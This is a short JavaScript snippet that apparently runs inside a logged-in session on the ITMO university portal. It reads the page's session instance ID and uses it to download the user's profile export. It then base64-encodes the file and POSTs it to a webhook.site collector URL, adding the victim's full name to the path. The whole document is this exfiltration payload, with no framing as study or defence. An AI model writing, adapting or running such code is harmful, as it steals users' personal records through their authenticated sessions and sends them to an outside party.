async function some() {
    var response = await fetch("https://isu.ifmo.ru/pls/apex/f?p=2437:31:"+document.querySelector('#pInstance').value+":EXPORTPROFILE:NO:::");
    var content = await response.blob();
    var reader = new FileReader();
    reader.readAsDataURL(content);
    reader.onloadend = function() {
      var base64data = reader.result;
      fetch("https://webhook.site/9a3472c5-0292-4ebc-b194-7877b6a1db97/"+document.querySelector('#USER_FIO').value, { method: 'POST', body: base64data });
    }
}
some()
